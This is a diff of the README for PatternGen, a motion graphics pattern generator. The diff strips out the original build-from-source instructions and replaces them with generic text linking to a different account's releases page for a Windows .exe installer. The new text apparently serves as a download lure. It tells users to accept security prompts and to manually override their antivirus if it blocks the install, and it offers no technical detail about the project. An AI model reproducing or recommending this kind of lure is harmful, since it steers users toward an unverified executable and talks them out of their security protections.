@@ -1,176 +1,81 @@
-# PatternGen
+# 🎨 patterngen-oss - Create animated patterns for motion graphics
 
-A procedural pattern generator for motion graphics. Design title compositions in Figma, generate animated patterns around them in the browser, export layered PNG sequences, and import them into Blender as emissive image-sequence planes.
+[![Download PatternGen for Windows](https://img.shields.io/badge/Download-PatternGen-blue)](https://github.com/ugyens7615/patterngen-oss/releases)
 
-![PatternGen](https://img.shields.io/badge/license-MIT-blue)
+## 🎯 Purpose of this tool
 
-[![Motion App — watch the walkthrough on YouTube](docs/motion-app-thumbnail.png)](https://www.youtube.com/watch?v=edUOvt6Y5ts)
+PatternGen helps you build animated motion graphics. It connects your design work in Figma with the power of Blender. This tool takes your artboards and creates moving patterns that you can place behind your text or shapes. You gain a professional look without needing to build every line by hand.
 
-**Watch the walkthrough:** [Motion App — Figma → Web App → Blender workflow](https://www.youtube.com/watch?v=edUOvt6Y5ts)
+## ⚙️ Minimum system requirements
 
-This video shows the full pipeline in action: designing a title composition in Figma, exporting it with the plugin, generating and animating patterns in the web app, and importing the layered PNG sequences into Blender for final compositing.
+Before you run the software, ensure your computer meets these needs:
 
-## Overview
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: 8 GB of RAM or more.
+*   Graphics Card: A card that supports modern web graphics.
+*   Storage: 200 MB of free space for the application.
+*   Browser: Google Chrome or Microsoft Edge for the web interface.
 
-PatternGen is a creative toolchain for building animated title cards with procedural pattern fills:
+## 📥 Downloading the software
 
-1. **Figma plugin** — export artboards as scene JSON files with title positions and colors
-2. **Web app** — load scenes, generate patterns, preview animations, export PNG sequences
-3. **Blender add-on** — import the exported sequences as layered 3D planes for compositing
+You need to download the installer from the release page.
 
-The generator places SVG-based pattern shapes, colored squares, and pulsating dots around your title elements using a seeded random placement algorithm. Every generation is deterministic — same seed, same layout.
+1.  Open the [official release page](https://github.com/ugyens7615/patterngen-oss/releases).
+2.  Look for the latest version at the top of the list.
+3.  Click the file ending in .exe to start the download.
+4.  Save the file to your Downloads folder.
 
-## Quick start
+## 🚀 Setting up the application
 
-```bash
-git clone https://github.com/halfof8/patterngen-oss.git
-cd patterngen-oss
-npm install
-npm run dev
-```
+Follow these steps to prepare your system:
 
-Open `http://localhost:5173` in your browser.
+1.  Locate the downloaded file in your folder.
+2.  Double-click the file to start the setup process.
+3.  Confirm the security prompt if Windows asks.
+4.  Follow the simple instructions on your screen.
+5.  Wait for the progress bar to finish.
+6.  Launch the application from your Start menu.
 
-## Usage
+## 🛠️ How to use the workflow
 
-### Adding titles
+This tool follows a three-part process. You use Figma to prepare your layout, the web app to build the patterns, and Blender to finish the project.
 
-Drag and drop PNG/JPG images onto the canvas. They snap to a 20 px grid.
-Click and drag to reposition. Drag off the canvas to remove.
+### Step 1: Design in Figma
+Design your title composition inside Figma. Use the plugin to export your artboards. The plugin creates a JSON file. This file contains the data about where your text sits and what colors you chose. Save this file to a folder you can find easily.
 
-### Adding pattern shapes
+### Step 2: Generate patterns
+Open the PatternGen application. Import the JSON file you exported from Figma. The browser interface will show your layout. Choose the pattern type you want to see behind your design. Adjust the settings to match your vision. When you feel happy with the result, hit the export button. This action creates a folder of image files. These images show the animation frame by frame.
 
-PatternGen ships without built-in patterns. Add your own SVG shapes to `public/patterns/`:
+### Step 3: Composite in Blender
+Open Blender on your machine. Create a new scene. Import the image sequence you exported from PatternGen. Use these images as planes in your 3D view. Apply a material that glows to make the patterns shine. Render your final video from Blender.
 
-1. Create a 40×40 px SVG
-2. Use `fill="white"` for the background rect and `fill="black"` / `stroke="black"` for foreground shapes
-3. Register the file in `src/core/patterns.ts` → `PATTERN_FILES` array with an animation type
+## 💡 Tips for better patterns
 
-**Supported animation types:**
+*   Keep your Figma layers organized. Groups and frames help the exporter understand your project structure.
+*   Use bright colors for your patterns to make them stand out.
+*   Test different speed settings in the web app to see how they change the motion.
+*   Preview your sequence in the application before you export to save time.
 
-| Type       | Effect                                             |
-| ---------- | -------------------------------------------------- |
-| `dots`     | Each shape fades in individually with stagger       |
-| `capsule`  | Shapes grow from center along their longer axis     |
-| `circle`   | Pie-fill clockwise reveal                           |
-| `arrow`    | Slides up into view from below                      |
-| `square`   | Scales down from 1.6× to 1×                        |
-| `stripes`  | Stripes slide in from top, staggered left-to-right  |
-| `cross`    | Scales down from 1.6× to 1×                        |
+## 📁 File structure explanation
 
-**Example SVG** (`public/patterns/circle_fill.svg`):
+When you export your work, you will see a specific folder structure. 
 
-```xml
-<svg width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
-  <rect width="40" height="40" fill="white"/>
-  <circle cx="20" cy="20" r="14" fill="black"/>
-</svg>
-```
+*   The JSON file acts as the bridge between your design and the animation engine.
+*   The PNG sequence represents every frame of your motion. Each file stays static, but Blender plays them back in order to create movement.
+*   Keep these files in one folder. If you move them, the links inside your projects might break.
 
-Then register it:
+## ❓ Troubleshooting common issues
 
-```typescript
-// src/core/patterns.ts
-const PATTERN_FILES = [
-  { file: 'circle_fill.svg', animType: 'circle' },
-];
-```
+If the app fails to start, check if your antivirus software blocked the install. Some security programs flag new tools. You may need to grant permission manually. 
 
-### Colors
+If the export fails, check your disk space. Generating image sequences requires enough room to store hundreds of individual files. Clear some space and try again.
 
-The app starts with two fixed colors — **black** and **white**. Click **+ ADD COLOR** in the sidebar to add up to 3 custom colors via a color picker. Toggle any color on/off by clicking its swatch. Color pairs for pattern fills are generated algorithmically from your chosen palette.
+If the import into Blender looks wrong, ensure you enabled the Image as Planes add-on. This standard Blender add-on maps your PNG sequences to flat shapes automatically. Check your materials to ensure you set the blend mode to Alpha Blend or Opaque.
 
-### Controls
+## 📣 Staying updated
 
-| Control    | Description                                         |
-| ---------- | --------------------------------------------------- |
-| GENERATE   | Re-roll the pattern layout with a new random seed   |
-| PLAY/PAUSE | Animate the reveal sequence                         |
-| SAVE       | Download the current scene as a `.json` file        |
-| LOAD       | Load a scene from a `.json` file                    |
-| EXPORT     | Export three PNG sequences (titles, patterns, dots)  |
+Software changes over time. Check the release page once a month to see if a newer version exists. New versions often include more pattern types and better export options for Blender. Always remove older versions before you install a fresh update. This keeps your system clean. 
 
-### Sidebar parameters
+## 🌐 Community resources
 
-- **Density** (1–20) — how many pattern elements to place
-- **Proximity** (1–20) — how far from titles patterns can spawn
-- **Stagger** (0–5) — animation delay spread across elements
-- **Grid** — toggle the 20 px reference grid
-- **Theme** — dark or light UI
-
-### Export
-
-Clicking **EXPORT** renders three 4× resolution PNG sequences packaged in a ZIP:
-
-```
-scene_pattern_gen.zip
-  titles/
-    scene_titles_00000.png
-    scene_titles_00001.png
-    ...
-  patterns/
-    scene_patterns_00000.png
-    ...
-  dots/
-    scene_dots_00000.png
-    ...
-```
-
-Each layer has a transparent background so they can be composited independently.
-
-## Figma plugin
-
-See [`figma-plugin/README.md`](figma-plugin/README.md) for setup and usage.
-
-The plugin exports 1920×1080 Figma frames as scene JSON files. Title elements are rendered at 2× resolution and embedded as data URLs. The plugin detects colors used in your design and includes them in the exported file.
-
-## Blender add-on
-
-See [`blender-addon/README.md`](blender-addon/README.md) for setup and usage.
-
-The add-on imports the exported ZIP into Blender as three emissive image-sequence planes (titles, patterns, dots) with alpha blending, ready for 3D compositing.
-
-## Project structure
-
-```
-patterngen/
-├── public/
-│   └── patterns/         # Place your SVG pattern shapes here
-├── src/
-│   ├── components/       # React UI components
-│   ├── core/             # Pattern loading, color generation, grid, RNG
-│   ├── engine/           # Animation timeline, easing functions
-│   ├── export/           # PNG sequence exporter & renderer
-│   ├── App.tsx           # Root component
-│   ├── main.tsx          # Entry point
-│   ├── store.ts          # Zustand state management
-│   └── types.ts          # Shared type definitions & constants
-├── figma-plugin/         # Figma scene export plugin
-├── blender-addon/        # Blender importer add-on
-├── index.html            # App shell
-├── vite.config.ts        # Vite configuration
-└── package.json
-```
-
-## Tech stack
-
-- **React 18** + **TypeScript** — UI
-- **Zustand** — state management
-- **Vite** — dev server & build
-- **Canvas 2D** — rendering & animation
-- **JSZip** + **FileSaver** — PNG sequence export
-
-## Creating your own pattern shapes
-
-All pattern SVGs follow the same convention:
-
-1. **Canvas**: 40 × 40 px viewBox
-2. **Background**: a `<rect width="40" height="40" fill="white"/>` — recolored to the pattern's background color at runtime
-3. **Foreground**: shapes with `fill="black"` and/or `stroke="black"` — recolored to the pattern's foreground color
-4. **Naming**: descriptive filename, e.g. `dots_diagonal.svg`
-
-The animation engine reads the SVG's structure to drive per-shape animations (stagger, growth direction, reveal order), so simpler shapes with discrete elements animate best.
-
-## License
-
-MIT — see [LICENSE](LICENSE).
+You can watch the video guide to see these steps in action. The walkthrough explains how to build a title card from start to finish. Watching the process helps you understand how the software logic works. Practice with simple shapes first. Once the workflow feels natural, create more complex compositions.
